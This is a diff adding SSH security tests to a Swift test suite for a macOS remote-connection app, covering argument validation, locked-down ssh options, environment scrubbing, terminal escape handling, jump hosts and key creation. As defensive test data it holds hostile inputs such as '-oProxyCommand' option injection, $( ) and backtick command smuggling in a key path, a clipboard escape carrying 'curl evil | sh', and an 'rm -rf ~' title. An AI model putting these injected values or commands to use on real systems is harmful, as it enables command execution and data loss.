@@ -4,6 +4,7 @@ import ImageIO
 import UniformTypeIdentifiers
 import VideoToolbox
 import CoreMedia
+import SwiftTerm
 
 var passed = 0, failed = 0
 func check(_ name: String, _ ok: Bool, _ detail: @autoclosure () -> String = "") {
@@ -481,6 +482,273 @@ let gw = try? JSONDecoder().decode(Gateway.self, from: Data(#"{"host":"rdg.examp
 check("a gateway with odd values still decodes", gw?.host == "rdg.example.com" && gw?.transport == .automatic)
 check("detected keyboard layout is one of ours", KeyboardLayout.allCases.contains(KeyboardLayout.detected()))
 print("  detected layout here: \(KeyboardLayout.detected().label)")
+
+// MARK: SSH
+print("== SSH")
+let oldHost = try? JSONDecoder().decode(Host.self, from: Data(#"{"address":"192.0.2.30","label":""}"#.utf8))
+check("a host saved before SSH is Remote Desktop", oldHost?.kind == .rdp && oldHost?.sshAuth == .key)
+var ssh = Host(address: "server.example.com", label: "web")
+ssh.kind = .ssh
+ssh.sshUser = "admin"
+let sshBack = try? JSONDecoder().decode(Host.self, from: JSONEncoder().encode(ssh))
+check("an SSH host saves and loads", sshBack?.isSSH == true && sshBack?.sshUser == "admin")
+
+func sshArgs(_ change: (inout Host) -> Void) -> [String]? {
+    var h = ssh
+    change(&h)
+    return try? SSHCommand.arguments(for: h)
+}
+let keyArgs = sshArgs { _ in } ?? []
+check("the locked-down options are always there", ["ForwardAgent=no", "ForwardX11=no", "StrictHostKeyChecking=ask"]
+      .allSatisfy { keyArgs.contains($0) })
+check("the destination comes last, after --", keyArgs.suffix(2) == ["--", "admin@server.example.com"])
+check("a key host never falls back to a password",
+      keyArgs.contains("PasswordAuthentication=no") && keyArgs.contains("KbdInteractiveAuthentication=no"))
+let pwArgs = sshArgs { $0.sshAuth = .password } ?? []
+check("a password host lets ssh ask", !pwArgs.contains("PasswordAuthentication=no"))
+check("a port is passed", sshArgs { $0.port = 2222 }.map { $0.contains("2222") && $0.contains("-p") } ?? false)
+check("a key file is passed with IdentitiesOnly",
+      sshArgs { $0.identityFile = "/Users/x/.ssh/id_ed25519" }.map { $0.contains("-i") && $0.contains("IdentitiesOnly=yes") } ?? false)
+check("an IPv6 address and a Windows user are fine",
+      sshArgs { $0.address = "fe80::1%en0"; $0.sshUser = #"CORP\admin"# } != nil
+      && sshArgs { $0.sshUser = "admin@corp.example" } != nil)
+check("an address that is an option is refused", sshArgs { $0.address = "-oProxyCommand=touch /tmp/x" } == nil)
+check("so is a user that is an option", sshArgs { $0.sshUser = "-oProxyCommand=x" } == nil)
+check("and spaces, control characters and @ in the address", sshArgs { $0.address = "a b" } == nil
+      && sshArgs { $0.address = "a\nb" } == nil && sshArgs { $0.address = "x@evil" } == nil)
+check("ports out of range are refused", sshArgs { $0.port = 0 } == nil && sshArgs { $0.port = 70000 } == nil)
+check("a relative key path is refused", sshArgs { $0.identityFile = "id_rsa" } == nil)
+
+// The real ssh, which only prints what it would use (-G) and connects nowhere,
+// against a config that tries to loosen everything.
+let hostile = FileManager.default.temporaryDirectory.appendingPathComponent("igateway-hostile-ssh-config")
+try? "Host *\n  ForwardAgent yes\n  ForwardX11 yes\n  StrictHostKeyChecking no\n  PasswordAuthentication yes\n"
+    .write(to: hostile, atomically: true, encoding: .utf8)
+let probe = Process()
+probe.executableURL = URL(fileURLWithPath: "/usr/bin/ssh")
+probe.arguments = ["-G", "-F", hostile.path] + keyArgs
+let probeOut = Pipe()
+probe.standardOutput = probeOut
+probe.standardError = FileHandle.nullDevice
+try? probe.run()
+let resolved = String(decoding: probeOut.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
+probe.waitUntilExit()
+try? FileManager.default.removeItem(at: hostile)
+check("ssh itself: ~/.ssh/config can't loosen the options",
+      ["forwardagent no", "forwardx11 no", "stricthostkeychecking ask", "passwordauthentication no",
+       "kbdinteractiveauthentication no", "user admin", "hostname server.example.com"]
+        .allSatisfy { resolved.contains("\n\($0)\n") || resolved.hasPrefix("\($0)\n") })
+
+let env = SSHCommand.environment(["HOME": "/Users/x", "SSH_AUTH_SOCK": "/tmp/agent", "AWS_SECRET_ACCESS_KEY": "s",
+                                  "DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"])
+check("ssh gets only the environment it needs", env.contains("SSH_AUTH_SOCK=/tmp/agent")
+      && env.contains("TERM=xterm-256color") && !env.contains { $0.hasPrefix("AWS_") || $0.hasPrefix("DYLD_") })
+
+check("links: web only", SSHTerminalView.openableLink("https://example.com/x") != nil
+      && SSHTerminalView.openableLink("file:///etc/passwd") == nil
+      && SSHTerminalView.openableLink("ssh://evil") == nil && SSHTerminalView.openableLink("javascript:alert(1)") == nil)
+check("pasting lines asks first, unless the program marks pastes",
+      SSHTerminalView.pasteNeedsConfirmation("rm -rf x\n", bracketed: false)
+      && !SSHTerminalView.pasteNeedsConfirmation("rm -rf x\n", bracketed: true)
+      && !SSHTerminalView.pasteNeedsConfirmation("one line", bracketed: false))
+
+var mixed = AppSettings()
+mixed.gateways = [Gateway(name: "Office", host: "rdg.example.com")]
+var behindGateway = ssh
+behindGateway.gatewayID = mixed.gateways[0].id
+behindGateway.identityFile = "/Users/x/.ssh/id_ed25519"
+mixed.hosts = [behindGateway]
+mixed.normalize()
+check("an SSH host always lands in direct connections", mixed.gateway(for: mixed.hosts[0])?.isDirect == true)
+let sshExport = String(decoding: try! mixed.exportedHosts(), as: UTF8.self)
+check("the export keeps the SSH fields but not the key file",
+      sshExport.contains("\"kind\" : \"ssh\"") && sshExport.contains("admin") && !sshExport.contains("id_ed25519"))
+var sshTarget = AppSettings()
+sshTarget.normalize()
+_ = try? sshTarget.importHosts(from: Data(sshExport.utf8))
+check("and imports as an SSH host", sshTarget.hosts.first?.isSSH == true && sshTarget.hosts.first?.sshUser == "admin")
+let evil = sshExport.replacingOccurrences(of: "server.example.com", with: "-oProxyCommand=x")
+var evilTarget = AppSettings()
+evilTarget.normalize()
+let evilResult = try? evilTarget.importHosts(from: Data(evil.utf8))
+check("an imported SSH host ssh would read as an option is left out",
+      evilTarget.hosts.isEmpty && evilResult?.skipped == 1)
+let rdpExport = String(decoding: try! source.exportedHosts(), as: UTF8.self)
+check("a Remote Desktop host exports as before", !rdpExport.contains("kind") && !rdpExport.contains("sshUser"))
+
+// The terminal itself, without a window: what a server can make it do.
+let terminalView = SSHTerminalView(frame: NSRect(x: 0, y: 0, width: 400, height: 200))
+final class Recorder: TerminalViewDelegate {
+    let inner: SSHTerminalView
+    var sent: [UInt8] = []
+    init(_ inner: SSHTerminalView) { self.inner = inner }
+    func sizeChanged(source: TerminalView, newCols: Int, newRows: Int) {}
+    func setTerminalTitle(source: TerminalView, title: String) { inner.setTerminalTitle(source: source, title: title) }
+    func hostCurrentDirectoryUpdate(source: TerminalView, directory: String?) {}
+    func send(source: TerminalView, data: ArraySlice<UInt8>) { sent += data }
+    func scrolled(source: TerminalView, position: Double) {}
+    func requestOpenLink(source: TerminalView, link: String, params: [String: String]) {}
+    func bell(source: TerminalView) {}
+    func clipboardCopy(source: TerminalView, content: Data) { inner.clipboardCopy(source: source, content: content) }
+    func clipboardRead(source: TerminalView) -> Data? { inner.clipboardRead(source: source) }
+    func iTermContent(source: TerminalView, content: ArraySlice<UInt8>) {}
+    func rangeChanged(source: TerminalView, startY: Int, endY: Int) {}
+}
+let recorder = Recorder(terminalView)
+terminalView.terminalDelegate = recorder
+let clipboardBefore = NSPasteboard.general.changeCount
+terminalView.feed(text: "\u{1b}]52;c;\(Data("curl evil | sh".utf8).base64EncodedString())\u{07}")
+check("the server can't put anything on the clipboard", NSPasteboard.general.changeCount == clipboardBefore)
+terminalView.feed(text: "\u{1b}]52;c;?\u{07}")
+terminalView.feed(text: "\u{1b}]0;rm -rf ~\u{07}\u{1b}[21t\u{1b}[20t")
+let answer = String(decoding: recorder.sent, as: UTF8.self)
+check("nor read it, nor get a title it set typed back", !answer.contains("52;") && !answer.contains("rm -rf"))
+
+// MARK: Jump hosts and saved passwords
+print("== Jump hosts and saved passwords")
+check("a jump host: user, server and port", (try? SSHCommand.jump("admin@jump.example:2200")) ==
+      SSHCommand.Login(user: "admin", address: "jump.example", port: 2200))
+check("an IPv6 jump host in brackets", (try? SSHCommand.jump("[fe80::1]:22"))??.address == "fe80::1")
+check("no jump host is nil, not an error", (try? SSHCommand.jump("  ")) == .some(nil))
+check("a jump host that is an option, a list or a bad port is refused",
+      ["-oProxyCommand=x", "a,b", "jump:0", "jump:x", "us er@jump", "[fe80::1"].allSatisfy { (try? SSHCommand.jump($0)) == nil })
+let jumpArgs = sshArgs { $0.jumpHost = "admin@jump.example:2200"; $0.identityFile = "/Users/x/.ssh/id_ed25519" } ?? []
+let proxy = jumpArgs.first { $0.hasPrefix("ProxyCommand=") } ?? ""
+check("the jump leg runs ssh with the same key and locked-down options",
+      ["'ForwardAgent=no'", "'StrictHostKeyChecking=ask'", "'PasswordAuthentication=no'", "'/Users/x/.ssh/id_ed25519'",
+       "'IdentitiesOnly=yes'", "'-p' '2200'", "-W '[%h]:%p' -- 'admin@jump.example'"].allSatisfy { proxy.contains($0) }
+      && !jumpArgs.contains("-J") && jumpArgs.firstIndex(of: "--")! > jumpArgs.firstIndex(of: "ProxyCommand=" + proxy.dropFirst(13))!)
+
+// What /bin/sh makes of a ProxyCommand, after ssh fills in its % tokens.
+func shellWords(_ command: String) -> [String] {
+    // Left to right, as ssh does: %% is a %, %h and %p are filled in.
+    var filled = "", chars = Array(command), i = 0
+    while i < chars.count {
+        if chars[i] == "%", i + 1 < chars.count {
+            filled += chars[i + 1] == "h" ? "192.0.2.9" : chars[i + 1] == "p" ? "22" : String(chars[i + 1])
+            i += 2
+        } else {
+            filled.append(chars[i])
+            i += 1
+        }
+    }
+    let sh = Process()
+    sh.executableURL = URL(fileURLWithPath: "/bin/sh")
+    sh.arguments = ["-c", "for w in " + filled.split(separator: " ", maxSplits: 1).last.map(String.init)! + "; do printf '%s\\n' \"$w\"; done"]
+    let out = Pipe()
+    sh.standardOutput = out
+    try? sh.run()
+    sh.waitUntilExit()
+    return String(decoding: out.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self).split(separator: "\n").map(String.init)
+}
+let pwned = "/tmp/igateway-pwned-\(getpid())"
+let nasty = "/Users/x/it's $(touch \(pwned)) `touch \(pwned)` 100%h \\ \"q\""
+let nastyProxy = (sshArgs { $0.jumpHost = "jump.example"; $0.identityFile = nasty } ?? [])
+    .first { $0.hasPrefix("ProxyCommand=") }.map { String($0.dropFirst(13)) } ?? ""
+let words = shellWords(nastyProxy)
+check("a key path with quotes, $( ), backticks and % reaches the jump leg as itself",
+      words.contains(nasty) && words.contains("[192.0.2.9]:22") && !FileManager.default.fileExists(atPath: pwned))
+check("a bad jump host stops the connection", sshArgs { $0.jumpHost = "-oProxyCommand=x" } == nil)
+let jumpProbe = Process()
+jumpProbe.executableURL = URL(fileURLWithPath: "/usr/bin/ssh")
+jumpProbe.arguments = ["-G", "-F", "/dev/null"] + jumpArgs
+let jumpOut = Pipe()
+jumpProbe.standardOutput = jumpOut
+jumpProbe.standardError = FileHandle.nullDevice
+try? jumpProbe.run()
+let jumpResolved = String(decoding: jumpOut.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
+jumpProbe.waitUntilExit()
+check("ssh itself takes the jump leg's command", jumpResolved.contains("\nproxycommand ") && jumpResolved.contains("admin@jump.example"))
+
+var grouped = AppSettings()
+var a = ssh; a.jumpHost = "admin@jump.example"
+var b = ssh; b.address = "192.0.2.50"; b.jumpHost = " admin@jump.example "
+var plainRDP = Host(address: "192.0.2.60", label: "")
+grouped.hosts = [a, b, plainRDP]
+grouped.normalize()
+let jumpGroups = grouped.gateways.filter(\.isJump)
+check("hosts with the same jump host share one group",
+      jumpGroups.count == 1 && grouped.hosts[0].gatewayID == jumpGroups[0].id && grouped.hosts[1].gatewayID == jumpGroups[0].id)
+plainRDP.gatewayID = jumpGroups.first?.id
+grouped.hosts[2] = plainRDP
+grouped.normalize()
+check("a Remote Desktop host never sits under a jump host", grouped.gateway(for: grouped.hosts[2])?.isDirect == true)
+grouped.hosts[0].jumpHost = ""
+grouped.hosts[1].jumpHost = ""
+grouped.normalize()
+check("clearing the jump host moves it back and the empty group goes",
+      grouped.gateways.filter(\.isJump).isEmpty && grouped.gateway(for: grouped.hosts[0])?.isDirect == true)
+grouped.hosts[0].jumpHost = "admin@jump.example"
+grouped.normalize()
+let jumpExport = String(decoding: try! grouped.exportedHosts(), as: UTF8.self)
+var jumpTarget = AppSettings()
+jumpTarget.normalize()
+_ = try? jumpTarget.importHosts(from: Data(jumpExport.utf8))
+check("an export keeps the jump host, and it isn't a gateway there",
+      !jumpExport.contains("\"host\" : \"admin@jump.example\"") && jumpExport.contains("admin@jump.example")
+      && jumpTarget.gateways.filter(\.isJump).count == 1
+      && jumpTarget.hosts.first { $0.jumpHost == "admin@jump.example" }.map { jumpTarget.gateway(for: $0)?.isJump == true } == true)
+
+let target1 = SSHCommand.Login(user: "admin", address: "server.example.com", port: nil)
+let jump1 = SSHCommand.Login(user: "admin", address: "jump.example", port: 2200)
+let logins = [target1, jump1]
+check("ssh's password prompt for the host is a password prompt",
+      Askpass.classify("admin@server.example.com's password: ", logins: logins) == .password(target1))
+check("and so is the keyboard-interactive one",
+      Askpass.classify("(admin@server.example.com) Password:", logins: logins) == .password(target1))
+check("the jump host's gets the jump host's password",
+      Askpass.classify("(admin@jump.example) Password: ", logins: logins) == .password(jump1))
+check("another user or server is not a password prompt",
+      Askpass.classify("root@server.example.com's password: ", logins: logins) == .other("root@server.example.com's password: ")
+      && Askpass.classify("admin@evil.example's password: ", logins: logins) == .other("admin@evil.example's password: "))
+check("a code or anything else the server asks is not a password prompt",
+      Askpass.classify("(admin@server.example.com) Verification code:", logins: logins)
+      == .other("(admin@server.example.com) Verification code:"))
+check("a new host key is a question for you",
+      { if case .hostKey = Askpass.classify("The authenticity of host 'x' can't be established.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? ", logins: logins) { return true }; return false }())
+check("saved passwords are kept per user, server and port",
+      target1.keychainKey == "ssh:admin@server.example.com:22" && jump1.keychainKey == "ssh:admin@jump.example:2200")
+
+// MARK: SSH keys (the tests' own home folder, never the real ~/.ssh)
+print("== SSH keys")
+check("the tests use their own home folder", !SSHKeys.directory.path.hasPrefix("/Users/\(NSUserName())/.ssh"))
+let keyName = "id_ed25519_test_\(getpid())"
+let made = try? SSHKeys.create(name: keyName, passphrase: "a long passphrase")
+check("a new key is made, private and public", made.map { FileManager.default.fileExists(atPath: $0)
+      && SSHKeys.publicKey($0)?.hasPrefix("ssh-ed25519 ") == true } ?? false)
+let mode = made.flatMap { try? FileManager.default.attributesOfItem(atPath: $0)[.posixPermissions] as? Int }
+check("only you can read the private key", mode == 0o600)
+check("it shows up in the key list", made.map { SSHKeys.list().contains($0) } ?? false)
+func unlocks(_ path: String, _ passphrase: String) -> Bool {
+    let p = Process()
+    p.executableURL = URL(fileURLWithPath: "/usr/bin/ssh-keygen")
+    p.arguments = ["-y", "-P", passphrase, "-f", path]
+    p.standardOutput = FileHandle.nullDevice
+    p.standardError = FileHandle.nullDevice
+    try? p.run()
+    p.waitUntilExit()
+    return p.terminationStatus == 0
+}
+check("the passphrase protects it", made.map { unlocks($0, "a long passphrase") && !unlocks($0, "") } ?? false)
+check("without a passphrase is possible too",
+      (try? SSHKeys.create(name: keyName + "_open", passphrase: "")).map { unlocks($0, "") } ?? false)
+check("a name that exists is refused", (try? SSHKeys.create(name: keyName, passphrase: "")) == nil)
+check("names that escape the folder or look like options are refused",
+      ["../evil", "-x", "a b", ".hidden", "", "x/y"].allSatisfy { !SSHKeys.isValidName($0) })
+if let made {
+    check("ssh's passphrase prompt for an existing key is recognised",
+          Askpass.classify("Enter passphrase for key '\(made)': ", logins: []) == .passphrase(made))
+}
+check("a key that isn't there, or a cut-off path, is a plain question",
+      Askpass.classify("Enter passphrase for key '/nowhere/key': ", logins: []) == .other("Enter passphrase for key '/nowhere/key': ")
+      && Askpass.classify("Enter passphrase for key '/\(String(repeating: "a", count: 99))': ", logins: [])
+         == .other("Enter passphrase for key '/\(String(repeating: "a", count: 99))': "))
+
+check("every terminal font is on this Mac", TerminalFont.allCases.allSatisfy {
+    $0.postScriptName.map { NSFont(name: $0, size: 13) != nil } ?? true })
+let settingsBefore = try? JSONDecoder().decode(AppSettings.self, from: Data(#"{"hosts":[]}"#.utf8))
+check("settings saved before terminal options get the defaults",
+      settingsBefore?.terminalFont == .sfMono && settingsBefore?.terminalFontSize == 13 && settingsBefore?.terminalTextColor == "")
 
 print("\n\(passed) passed, \(failed) failed")
 exit(failed == 0 ? 0 : 1)
